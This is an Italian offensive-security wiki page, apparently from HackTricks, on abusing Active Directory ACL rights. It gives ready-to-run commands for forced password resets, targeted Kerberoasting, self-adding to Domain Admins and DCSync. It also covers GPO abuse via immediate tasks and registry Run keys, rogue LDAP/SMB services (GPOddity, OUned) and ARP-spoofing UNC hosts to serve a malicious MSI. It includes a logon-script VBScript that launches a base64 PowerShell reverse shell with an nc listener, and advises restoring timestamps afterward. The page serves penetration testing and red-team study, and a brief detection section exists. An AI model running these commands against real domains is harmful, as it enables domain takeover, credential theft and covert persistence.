# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Questa pagina è principalmente un riepilogo delle tecniche trattate in** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e in** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Per maggiori dettagli, consulta gli articoli originali.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Diritti GenericAll su un utente**

Questo privilegio concede a un attacker il controllo completo dell'account utente target. Dopo aver confermato i diritti `GenericAll` usando il comando `Get-ObjectAcl`, un attacker può:

- **Cambiare la password del target**: usando `net user <username> <password> /domain`, l'attacker può reimpostare la password dell'utente.
- Da Linux, è possibile fare la stessa cosa tramite SAMR con Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Se l'account è disabilitato, rimuovi il flag UAC**: `GenericAll` consente di modificare `userAccountControl`. Da Linux, BloodyAD può rimuovere il flag `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Assegna un SPN all'account dell'utente per renderlo kerberoastable, quindi usa Rubeus e targetedKerberoast.py per estrarre e tentare di crackare gli hash del ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **ASREPRoasting mirato**: Disabilita la pre-autenticazione per l'utente, rendendo il suo account vulnerabile ad ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Con `GenericAll` su un utente puoi aggiungere una credenziale basata su certificato e autenticarti come quell'utente senza modificarne la password. Vedi:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Diritti GenericAll su un gruppo**

Questo privilegio consente a un attaccante di manipolare le appartenenze ai gruppi se dispone dei diritti `GenericAll` su un gruppo come `Domain Admins`. Dopo aver identificato il nome distinto del gruppo con `Get-NetGroup`, l'attaccante può:

- **Aggiungersi al gruppo Domain Admins**: Questo può essere fatto tramite comandi diretti o utilizzando moduli come Active Directory o PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Da Linux puoi anche sfruttare BloodyAD per aggiungerti a gruppi arbitrari quando disponi dei permessi GenericAll/Write su di essi. Se il gruppo target è annidato in “Remote Management Users”, otterrai immediatamente l'accesso WinRM agli host che rispettano quel gruppo:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Il possesso di questi privilegi su un oggetto computer o su un account utente consente di:

- **Kerberos Resource-based Constrained Delegation**: consente di prendere il controllo di un oggetto computer.
- **Shadow Credentials**: consente di impersonare un account computer o utente sfruttando i privilegi per creare shadow credentials.

## **WriteProperty on Group**

Se un utente dispone dei diritti `WriteProperty` su tutti gli oggetti di un gruppo specifico (ad esempio, `Domain Admins`), può:

- **Add Themselves to the Domain Admins Group**: ottenibile combinando i comandi `net user` e `Add-NetGroupUser`, questo metodo consente l'escalation dei privilegi all'interno del dominio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Questo privilegio consente agli attaccanti di aggiungersi a gruppi specifici, come `Domain Admins`, tramite comandi che manipolano direttamente l'appartenenza ai gruppi. La seguente sequenza di comandi consente di aggiungersi autonomamente:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilegio simile consente agli aggressori di aggiungersi direttamente ai gruppi modificandone le proprietà, se dispongono del diritto `WriteProperty` su tali gruppi. La conferma e l'esecuzione di questo privilegio vengono effettuate con:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Avere il `ExtendedRight` su un utente per `User-Force-Change-Password` consente di reimpostare la password senza conoscere quella corrente. La verifica di questo diritto e il suo sfruttamento possono essere eseguiti tramite PowerShell o strumenti alternativi da riga di comando, offrendo diversi metodi per reimpostare la password di un utente, incluse sessioni interattive e one-liner per ambienti non interattivi. I comandi spaziano da semplici invocazioni PowerShell all'utilizzo di `rpcclient` su Linux, dimostrando la versatilità dei vettori di attacco.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner su un Group**

Se un attacker scopre di avere diritti `WriteOwner` su un group, può modificare la proprietà del group assegnandola a sé stesso. Questo è particolarmente importante quando il group in questione è `Domain Admins`, poiché la modifica della proprietà consente un controllo più ampio sugli attributi e sui membri del group. Il processo prevede l'identificazione dell'oggetto corretto tramite `Get-ObjectAcl` e quindi l'utilizzo di `Set-DomainObjectOwner` per modificare il proprietario, tramite SID o nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite su User**

Questa permission consente a un attacker di modificare le proprietà di un user. Nello specifico, con accesso `GenericWrite`, l'attacker può modificare il percorso dello script di logon di un user per eseguire uno script malevolo al logon dell'user. Questo si ottiene usando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'user target, facendola puntare allo script dell'attacker.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Con questo privilegio, gli attaccanti possono manipolare l'appartenenza ai gruppi, ad esempio aggiungendo se stessi o altri utenti a gruppi specifici. Questo processo prevede la creazione di un credential object, il suo utilizzo per aggiungere o rimuovere utenti da un gruppo e la verifica delle modifiche all'appartenenza tramite comandi PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Da Linux, Samba `net` può aggiungere/rimuovere membri quando disponi di `GenericWrite` sul gruppo (utile quando PowerShell/RSAT non sono disponibili):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Essere proprietari di un oggetto AD e disporre dei privilegi `WriteDACL` su di esso consente a un attacker di assegnarsi privilegi `GenericAll` sull'oggetto. Ciò viene ottenuto tramite la manipolazione di ADSI, permettendo il controllo completo dell'oggetto e la possibilità di modificare le appartenenze ai gruppi. Tuttavia, esistono limitazioni quando si tenta di sfruttare questi privilegi utilizzando i cmdlet `Set-Acl` / `Get-Acl` del modulo Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Quick takeover di WriteDACL/WriteOwner (PowerView)

Quando disponi di `WriteOwner` e `WriteDacl` su un account utente o di servizio, puoi ottenere il pieno controllo e reimpostarne la password usando PowerView senza conoscere la vecchia password:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Nota:
- Potrebbe essere necessario cambiare prima il proprietario impostandoti come proprietario se disponi solo di `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validate l'accesso con qualsiasi protocollo (SMB/LDAP/RDP/WinRM) dopo il reset della password.

## **Replication on the Domain (DCSync)**

L'attacco DCSync sfrutta permessi di replication specifici sul domain per simulare un Domain Controller e sincronizzare i dati, incluse le credenziali degli utenti. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, consentendo agli attacker di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller.<sup>[[5]](#references)</sup> [**Scopri di più sull'attacco DCSync qui.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

L'accesso delegato alla gestione dei Group Policy Objects (GPO) può comportare rischi significativi per la sicurezza. Ad esempio, se a un utente come `offense\spotless` vengono delegati i diritti di gestione dei GPO, potrebbe disporre di privilegi come **WriteProperty**, **WriteDacl** e **WriteOwner**. Questi permessi possono essere sfruttati per scopi malevoli, come identificato utilizzando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Per identificare i GPO configurati in modo errato, è possibile concatenare i cmdlet di PowerSploit. Ciò consente di individuare i GPO che un utente specifico ha i permessi di gestire: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: È possibile determinare a quali computer si applica uno specifico GPO, aiutando a comprendere l'ambito del potenziale impatto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Per verificare quali policy vengono applicate a un determinato computer, è possibile utilizzare comandi come `Get-DomainGPO`.

**OUs with a Given Policy Applied**: È possibile identificare le organizational unit (OU) interessate da una determinata policy utilizzando `Get-DomainOU`.

È inoltre possibile utilizzare lo strumento [**GPOHound**](https://github.com/cogiceo/GPOHound) per enumerare i GPO e individuare eventuali problemi.

### Abuse GPO - New-GPOImmediateTask

I GPO configurati in modo errato possono essere sfruttati per eseguire codice, ad esempio creando un'attività pianificata immediata. Ciò può essere utilizzato per aggiungere un utente al gruppo degli amministratori locali sui computer interessati, elevando significativamente i privilegi:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Il module GroupPolicy, se installato, consente la creazione e il collegamento di nuovi GPO e l'impostazione di preferenze come valori di registro per eseguire backdoor sui computer interessati. Questo metodo richiede che il GPO venga aggiornato e che un utente effettui l'accesso al computer per l'esecuzione:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuso dei GPO

SharpGPOAbuse offre un metodo per abusare dei GPO esistenti aggiungendo attività o modificando impostazioni senza dover creare nuovi GPO. Questo tool richiede la modifica di GPO esistenti oppure l'uso degli strumenti RSAT per crearne di nuovi prima di applicare le modifiche:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzare l'aggiornamento dei criteri

Gli aggiornamenti GPO avvengono in genere ogni 90 minuti circa. Per accelerare questo processo, soprattutto dopo aver implementato una modifica, è possibile usare il comando `gpupdate /force` sul computer target per forzare un aggiornamento immediato dei criteri. Questo comando garantisce che qualsiasi modifica ai GPO venga applicata senza attendere il successivo ciclo di aggiornamento automatico.

### Dietro le quinte

Esaminando le Scheduled Tasks di un determinato GPO, come `Misconfigured Policy`, è possibile confermare l'aggiunta di task come `evilTask`. Questi task vengono creati tramite script o strumenti da riga di comando con l'obiettivo di modificare il comportamento del sistema o eseguire un'escalation dei privilegi.

La struttura del task, come mostrato nel file di configurazione XML generato da `New-GPOImmediateTask`, descrive i dettagli del Scheduled Task, incluso il comando da eseguire e i relativi trigger. Questo file rappresenta il modo in cui i Scheduled Tasks vengono definiti e gestiti all'interno dei GPO, fornendo un metodo per eseguire comandi o script arbitrari nell'ambito dell'applicazione dei criteri.

### Utenti e gruppi

I GPO consentono anche di manipolare le appartenenze a utenti e gruppi nei sistemi target. Modificando direttamente i file dei criteri Users and Groups, gli attacker possono aggiungere utenti a gruppi privilegiati, come il gruppo locale `administrators`. Ciò è possibile tramite la delega delle autorizzazioni di gestione dei GPO, che consente di modificare i file dei criteri per includere nuovi utenti o cambiare le appartenenze ai gruppi.

Il file di configurazione XML per Users and Groups descrive come vengono implementate queste modifiche. Aggiungendo voci a questo file, è possibile concedere privilegi elevati a utenti specifici su tutti i sistemi interessati. Questo metodo offre un approccio diretto all'escalation dei privilegi tramite la manipolazione dei GPO.

Inoltre, possono essere presi in considerazione ulteriori metodi per eseguire codice o mantenere la persistenza, come l'uso di script di logon/logoff, la modifica delle chiavi di registro per gli autorun, l'installazione di software tramite file .msi o la modifica delle configurazioni dei servizi. Queste tecniche offrono diversi modi per mantenere l'accesso e controllare i sistemi target tramite l'abuso dei GPO.

### Reindirizzare il recupero di GPC/GPT verso servizi rogue autenticati

Un GPO è costituito da un **Group Policy Container (GPC)** LDAP contenente i metadati e da un **Group Policy Template (GPT)** ospitato su SMB, contenente i file dei criteri. Durante l'aggiornamento, il client segue il `gPLink` del container, legge il GPC indicato e il relativo `gPCFileSysPath`, quindi scarica il GPT dal percorso UNC. Di conseguenza, l'accesso in scrittura al GPC stesso o al `gPLink` di un'OU, Site o Domain può essere convertito in un'elaborazione privilegiata dei criteri.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Avvelenamento di `gPCFileSysPath` con GPOddity

Se il principal controllato può scrivere nel GPC target (direttamente o tramite **NTLM relay to LDAP**), sostituire `gPCFileSysPath` con un percorso UNC ospitato dall'attacker. [GPOddity](https://github.com/synacktiv/GPOddity) automatizza la modifica LDAP e serve un GPT malevolo contenente file dei criteri basati su moduli o un Immediate Task che il client Group Policy esegue come `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Una condivisione SMB anonima o indipendente dalle credenziali non è sufficiente sui client Windows attuali: SMB Secure Negotiate richiede la prova che l'autenticazione sia riuscita, quindi il servizio rogue deve convalidare l'identità del dominio, derivare la chiave di sessione SMB e firmare correttamente le proprie risposte. In modalità embedded, configurare GPOddity con un account computer controllato e la relativa chiave del servizio, quindi selezionare un payload lato computer o lato utente nella sezione `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**Caso particolare della GPO utente:** dopo MS16-072, Windows crea ancora due sessioni SMB2 nella **stessa connessione TCP**: la sessione utente legge `GPT.INI`, quindi la sessione dell'account computer legge la configurazione effettiva, come `ScheduledTasks.xml`. Pertanto, un server malevolo deve indicizzare lo stato di autenticazione, le chiavi di sessione e le chiavi di signing in base a `SessionId` SMB2, non solo al socket. Il fork di Scapy integrato in GPOddity/OUned implementa questa funzionalità tramite `SMBStreamSocketMultiplexing` e un `SMBServer` consapevole del multiplexing; i server Impacket/Scapy a sessione singola altrimenti riutilizzano lo stato di signing errato e falliscono con le user policies.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning con OUned

Con `WriteGPLink`, `GenericWrite` o un controllo equivalente su una OU, un Site o un Domain, un attacker può aggiungere un link il cui GPC DN è fornito da un host LDAP controllato dall'attacker. Questa primitiva è stata presentata originariamente da Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) automatizza la scrittura LDAP e la catena GPC/GPT malevola.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
La vittima esegue prima l'autenticazione al servizio LDAP rogue e riceve un GPC il cui `gPCFileSysPath` punta al servizio SMB rogue; quindi esegue l'autenticazione a SMB e applica il GPT fornito. OUned necessita pertanto di un account con un LDAP SPN, di un account macchina con un HOST SPN per SMB (lo stesso account macchina può soddisfare entrambi i requisiti) e di una risoluzione DNS o di un reverse forwarding che inoltri le porte 389 e 445 all'host dell'operatore.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
Il server LDAP Scapy integrato di OUned convalida Kerberos/SPNEGO usando la chiave reale del servizio controllato e serve dati GPC arbitrari da JSON. La chiave JSON vuota rappresenta rootDSE, i prefissi `base64:` rappresentano valori binari e il server supporta add/delete/modify/search oltre alle ricerche `BASE`, `LEVEL` e `SUBTREE`; può negoziare nessuna protezione, l'integrità o la riservatezza. Questo rende il servizio riutilizzabile quando un altro componente Windows segue un riferimento LDAP controllato dall'attaccante, ma richiede LDAP autenticato.<sup>[[15]](#references)</sup>

Non bisogna presumere che la sincronizzazione della password di un account in un dominio fittizio riproduca ogni chiave Kerberos: RC4 deriva dalla password, mentre AES string-to-key usa anche un salt derivato dall'hostname/dominio del principal. Fornire la chiave AES effettiva dell'account a `KerberosSSP` evita di forzare RC4 tramite una modifica rilevabile a `msDS-SupportedEncryptionTypes` dell'account computer, scrivibile autonomamente.<sup>[[15]](#references)</sup>

#### Pivot di detection

Correlare le modifiche a `gPCFileSysPath` o `gPLink` con le modifiche alla versione delle GPO e con nuovi file XML di Immediate/Scheduled Task. Investigare i link verso naming context imprevisti, gli host UNC al di fuori dell'insieme approvato di DC/SYSVOL, i record DNS che reindirizzano i nomi degli account computer, i service ticket LDAP/CIFS per account computer insoliti e le modifiche a `msDS-SupportedEncryptionTypes` che abilitano RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` su un'OU/dominio consente di modificare l'attributo `gPLink` del container di destinazione e **forzare l'applicazione di una GPO esistente** senza modificare la GPO stessa. Questo diventa interessante quando la GPO collegata fa già riferimento a contenuti remoti tramite **UNC paths** (`\\HOST\share\...`), perché gli utenti autenticati possono leggere **SYSVOL** e cercare policy riutilizzabili offline.<sup>[[11]](#references)</sup>

Workflow di alto livello:

1. Usa BloodHound per identificare un principal con `WriteGPLink` su un'OU ed enumerare computer/utenti all'interno di quell'OU.
2. Clona `SYSVOL` in sola lettura ed esegui il parsing delle GPO cercando **Software Installation**, **drive mappings** (`Drives.xml`) e **logon/startup scripts** che fanno riferimento a UNC paths.
3. Preferisci le policy che puntano a un **hostname diretto** (ad esempio `\\DC02\share\pkg.msi`) invece dei path DFS/domain-namespace, perché i path basati sull'hostname sono più facili da reindirizzare con L2 spoofing.
4. Aggiungi il GUID della GPO scelta al `gPLink` dell'OU di destinazione, affinché la vittima elabori quella policy già esistente.
5. Nello stesso broadcast domain, esegui ARP spoofing dell'host UNC e associa localmente il suo IP (`ip addr add <target_ip>/32 dev <iface>`) in modo che il traffico SMB della vittima raggiunga il tuo host.
6. Servi il path/nome file previsto da un server SMB dell'attaccante (ad esempio `smbserver.py`) e attendi la normale elaborazione delle policy.

Esempio di raccolta di `SYSVOL` e correlazione delle GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Collega il GPO esistente all'OU di destinazione:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Se la GPO collegata distribuisce un MSI da un percorso UNC, il client lo recupererà durante l'**avvio del computer** e lo installerà come **`NT AUTHORITY\SYSTEM`**. Falsificando l'host indicato e fornendo un MSI malevolo sotto la **stessa condivisione/percorso/nome**, puoi trasformare `WriteGPLink` in un'esecuzione di codice come SYSTEM **senza modificare SYSVOL**.

Vincoli importanti:

- **Il timing è importante**: il nuovo collegamento viene rilevato durante l'aggiornamento dei criteri (comunemente ogni ~90 minuti), ma **Software Installation** viene solitamente attivato al **riavvio**.
- Windows Installer tiene comunemente traccia della distribuzione usando il **`ProductCode`** del pacchetto. Se il prodotto è già installato, la distribuzione potrebbe essere ignorata.
- Per evitare il rifiuto da parte dell'installer, modifica l'MSI rogue in modo che i suoi **`ProductCode`** e **`PackageCode`** corrispondano a quelli del pacchetto legittimo previsto dalla GPO.
- I vecchi file di annuncio `.aas` potrebbero rimanere in `SYSVOL`, quindi verifica che la distribuzione risulti ancora attiva prima di farvi affidamento.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Le mappature delle unità GPP in `Drives.xml` causano l'autenticazione degli utenti al percorso UNC configurato durante il logon o la riconnessione. Se fai spoofing dell'host indicato, puoi catturare **NetNTLMv2**. Se SMB viene fatto fallire deliberatamente, Windows potrebbe ritentare tramite **WebDAV**, inviando **NTLM over HTTP**, una modalità molto più flessibile per i relay verso **LDAP(S)**, **AD CS** o **SMB**.

#### Logon/startup script UNC hijack

Lo stesso schema si applica agli script ospitati su UNC individuati in `SYSVOL`:

- Gli **script di logon** vengono solitamente eseguiti nel contesto dell'**utente**.
- Gli **script di startup** vengono solitamente eseguiti nel contesto del **computer / SYSTEM**.

Se il percorso dello script punta a un hostname sottoponibile a spoofing, reindirizza l'host UNC e servi contenuti sostitutivi dello script dalla posizione prevista.

## SYSVOL/NETLOGON Logon Script Poisoning

I percorsi scrivibili sotto `\\<dc>\SYSVOL\<domain>\scripts\` o `\\<dc>\NETLOGON\` consentono di manomettere gli script di logon eseguiti all'accesso dell'utente tramite GPO. Ciò consente l'esecuzione di codice nel contesto di sicurezza degli utenti che effettuano il logon.

### Individuare gli script di logon
- Esamina gli attributi degli utenti per individuare uno script di logon configurato:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Scansiona le condivisioni del dominio per individuare collegamenti o riferimenti a script:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analizza i file `.lnk` per risolvere le destinazioni che puntano a SYSVOL/NETLOGON (trucco DFIR utile e per gli attaccanti senza accesso diretto alle GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound mostra l'attributo `logonScript` (scriptPath) sui nodi utente, quando presente.

### Verifica l'accesso in scrittura (non fidarti degli elenchi delle condivisioni)
Gli strumenti automatizzati possono mostrare SYSVOL/NETLOGON come di sola lettura, ma gli ACL NTFS sottostanti possono comunque consentire le scritture. Esegui sempre un test:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Se le dimensioni del file o il mtime cambiano, hai accesso in scrittura. Conserva gli originali prima di modificarli.

### Avvelena uno script di logon VBScript per RCE
Aggiungi un comando che avvii una reverse shell PowerShell (generala da revshells.com) e mantieni la logica originale per evitare di interrompere la funzione aziendale:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Ascolta sul tuo host e attendi il prossimo accesso interattivo:
```bash
rlwrap -cAr nc -lnvp 443
```
Note:
- L'esecuzione avviene con il token dell'utente che esegue il logging (non SYSTEM). L'ambito è il collegamento GPO (OU, site, domain) che applica quello script.
- Eseguire la pulizia ripristinando il contenuto e i timestamp originali dopo l'uso.


## References

- [1] [Abuso delle ACL/ACE di Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Account privilegiati e privilegi dei token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – L'aggiornamento dei percorsi di attacco ACL](https://wald0.com/?p=112)
- [4] [Enum ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalation dei privilegi con le ACL in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Scansione dei privilegi e degli account privilegiati di Active Directory](https://adsecurity.org/?p=3658)
- [7] [Costruttore ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – operazioni su attributi/UAC di AD da Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (appartenenza ai gruppi)](https://www.samba.org/)
- [10] [HTB Puppy: abuso delle ACL AD, cracking di KeePassXC Argon2 e decrittazione DPAPI fino a DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking dei percorsi UNC GPO per l'esecuzione di codice e NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: sfruttamento delle GPO di Active Directory tramite NTLM relaying e altro](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [Una OU che fa ridere? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: sfruttamento dei vettori di attacco ACL delle Organizational Unit nascoste in Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulazione di servizi Active Directory legittimi sulla rete: il caso dello sfruttamento delle GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
